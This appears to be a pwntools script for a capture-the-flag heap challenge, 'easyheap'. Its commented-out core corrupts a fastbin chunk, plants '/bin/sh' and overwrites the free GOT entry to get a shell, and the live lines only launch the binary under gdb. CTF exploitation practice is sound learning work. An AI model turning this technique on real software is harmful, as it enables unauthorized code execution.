from pwn import *

r = process('./easyheap')
elf = ELF('./easyheap')

context.log_level = 'debug'

gdb.attach(r)

# def create(size, content):
#     r.sendlineafter(b'Your choice :', b'1')
#     r.sendlineafter(b'Size of Heap :', str(size).encode())
#     r.sendafter(b'Content of heap :', content)

# def edit(idx,size,content):
#     r.sendlineafter(b'Your choice :', b'2')
#     r.sendlineafter(b'Index :', str(idx).encode())
#     r.sendlineafter(b'Size of Heap :', str(size).encode())
#     r.sendafter(b'Content of heap :', content)

# def free(idx):
#     r.sendlineafter(b'Your choice :', b'3')
#     r.sendlineafter(b'Index :', str(idx).encode())

# free_got = elf.got['free']
# create(0x68,'aaaa') #0
# create(0x68,'bbbb') #1
# create(0x68,'cccc') #2
# free(2)

# payload = '/bin/sh\x00' + 'a'* 0x60 + p64(0x71) + p64(0x6020ad)
# edit(1,len(payload),payload)

# create(0x68,'dddd') #2
# create(0x68,'e') #3

# payload = '\xaa' * 3 +  p64(0) * 4 +p64(free_got)
# edit(0,len(payload),payload)

# free(1)

r.interactive()
